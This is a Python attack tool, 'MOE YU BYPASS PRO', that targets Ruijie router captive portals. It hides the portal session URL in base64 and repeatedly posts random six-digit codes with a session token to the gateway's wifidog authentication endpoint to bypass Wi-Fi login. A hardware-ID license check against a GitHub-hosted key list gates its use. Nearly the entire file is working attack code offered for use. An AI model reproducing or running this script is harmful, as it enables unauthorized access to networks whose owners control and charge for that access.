import os
import re
import sys
import uuid
import time
import json
import zlib
import ntplib
import ping3
import base64
import random
import string
import urllib
import hashlib
import asyncio
import aiohttp
import requests
import argparse
import marshal
import subprocess
from datetime import datetime
from urllib.parse import quote
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
from Crypto.Random import get_random_bytes
from concurrent.futures import ThreadPoolExecutor

# --- CONFIGURATION ---
KEY_URL = "https://raw.githubusercontent.com/hhtethtet277-svg/my-database-/main/key.txt"

# Colors
w, g, y, r, b, c = "\033[1;37m", "\033[1;32m", "\033[1;33m", "\033[1;31m", "\033[1;34m", "\033[1;36m"

def get_hwid():
    """လူတိုင်းအတွက် မတူညီတဲ့ Unique Fixed ID ထုတ်ပေးမည့်စနစ်"""
    try:
        # ဖုန်းရဲ့ Hardware အချက်အလက်များကို ပေါင်းစပ်ခြင်း
        model = os.popen('getprop ro.product.model').read().strip()
        board = os.popen('getprop ro.product.board').read().strip()
        # ပုံသေဖြစ်မည့် Termux User ID တစ်ခုကို ယူခြင်း
        user = os.popen('whoami').read().strip()
        
        raw_id = f"{model}-{board}-{user}"
        # အကယ်၍ အချက်အလက် မရခဲ့ရင် UUID Node ကို သုံးမယ်
        if len(raw_id) < 5:
            raw_id = str(uuid.getnode())
            
        return hashlib.md5(raw_id.encode()).hexdigest().upper()
    except:
        return "MOEYU-STABLE-USER-UNSET"

def Logo():
    os.system("clear")
    my_id = get_hwid()
    logo = f"""{r}
 ███▄           ▄████▄   ▓█████  ██   ██  ██   ██ 
 ▓██ ▀█▄       ▒██    ▀  ▓█   ▀  ▒██  ██▒ ▒██  ██▒
 ▓██  ▀█▄      ▒██       ▒███     ▒██ ██░  ▒██ ██░
 ░██   █▌      ▒██    ▄  ▒▓█  ▄   ░ ▐██▓░  ░ ▐██▓░
 ░██████░      ▒ ████▀   ░▒████▒  ░ ██▒▓░  ░ ██▒▓░
{g}         ── {w}MOE YU BYPASS PRO {g}──{w}"""
    print(logo)
    print(f"{y}─" * os.get_terminal_size()[0])
    print(f"{g}  [👤] {w}Dev      : {y}@moeyu")
    print(f"{g}  [🆔] {w}Fixed ID : {c}{my_id}")
    print(f"{g}  [🛡️] {w}Target   : {r}Ruijie Router Only")
    print(f"{y}─" * os.get_terminal_size()[0])

def check_key():
    my_id = get_hwid()
    Logo()
    print(f"{y}[*] Verifying Stable License...{w}")
    try:
        res = requests.get(KEY_URL, timeout=15)
        if res.status_code == 200:
            lines = res.text.splitlines()
            for line in lines:
                if "|" in line:
                    # split လုပ်တဲ့အခါ ကွက်လပ် (Space) များကို ဖယ်ထုတ်ရန် strip() သုံးထားသည်
                    parts = line.split("|")
                    key = parts[0].strip()
                    exp_str = parts[1].strip()
                    
                    if key == my_id:
                        today = datetime.now().date()
                        expiry = datetime.strptime(exp_str, "%Y-%m-%d").date()
                        if today <= expiry:
                            print(f"{g}[+] Access Authorized!{w}")
                            time.sleep(1)
                            return True
                        else:
                            print(f"{r}[!] YOUR KEY EXPIRED!{w}")
                            sys.exit()
            
            print(f"{r}[!] UNREGISTERED ID!{w}")
            print(f"{y}[>] Your ID: {c}{my_id}{w}")
            print(f"{y}[>] Copy this ID and put it in GitHub key.txt")
            sys.exit()
    except:
        print(f"{r}[!] Database Connection Error!{w}")
        sys.exit()

async def get_session_id(session, session_url, prev_id):
    headers = {'User-Agent': 'Mozilla/5.0'}
    try:
        async with session.get(session_url, headers=headers, timeout=5) as req:
            return re.search(r"[?&]sessionId=([a-zA-Z0-9]+)", str(req.url)).group(1)
    except: return prev_id

class InternetAccess:
    def __init__(self):
        self.session_url = base64.b64decode(b'aHR0cHM6Ly9wb3J0YWwtYXMucnVpamllbmV0d29ya3MuY29tL2FwaS9hdXRoL3dpZmlkb2c/c3RhZ2U9cG9ydGFsJmd3X2lkPTU4YjRiYmNiZmQwZCZnd19zbj1IMVU0MFNYMDExNTA3Jmd3X2FkZHJlc3M9MTkyLjE2OC45OS4xJmd3X3BvcnQ9MjA2MCZpcD0xOTIuMTY4Ljk5LjU0Jm1hYz0zYTpkZDo3ZTo2NDo4NzozNiZzbG90X251bT0xMyZuYXNpcD0xOTIuMTY4LjEuMTczJnNzaWQ9VkxBTjk5JnVzdGF0ZT0wJm1hY19yZXE9MSZ1cmw9aHR0cCUzQSUyRiUyRjE5Mi4xNjguMC4xJTJGJmNoYXBfaWQ9JTVDMzEwJmNoYXBfY2hhbGxlbmdlPSU1QzIxNiU1QzE2MCU1QzEyMiU1QzE3NyU1QzIxNyU1QzM2MCU1QzM2MyU1QzMyMSU1QzA1NiU1QzExMyU1QzIzMiU1QzIyMSU1QzMzMiU1QzI2MCU1QzI1MCU1QzAwMQ==').decode()
        try: self.ip = open(".ip", "r").read().strip()
        except: print(f"{r}[!] Run setup first!"); sys.exit()

    async def execute(self):
        Logo()
        async with aiohttp.ClientSession() as session:
            l = 0
            while True:
                if l % 5 == 0: sid = await get_session_id(session, self.session_url, None)
                code = "".join(random.choice(string.digits) for _ in range(6))
                try:
                    async with session.post(f'http://{self.ip}:2060/wifidog/auth?', params={'token': sid, 'phoneNumber': code}) as res:
                        print(f"{w}[{datetime.now().strftime('%H:%M:%S')}] Bypass: {g}{res.status}")
                except: pass
                await asyncio.sleep(1)
                l += 1

def feature():
    parser = argparse.ArgumentParser()
    parser.add_argument("-o", "--option", choices=["internet", "setup"], required=True)
    args = parser.parse_args()
    if args.option == "setup":
        Logo()
        try:
            res = requests.get("http://192.168.0.1", timeout=5).url
            gw = re.search('gw_address=(.*?)&', res).group(1)
            with open(".ip", "w") as f: f.write(gw)
            print(f"{g}[+] Setup Success!{w}")
        except: print(f"{r}[!] Setup Failed.")
    elif args.option == "internet":
        asyncio.run(InternetAccess().execute())

if __name__ == "__main__":
    if check_key():
        try: feature()
        except KeyboardInterrupt: print(f"\n{r}[!] Stopped.{w}")
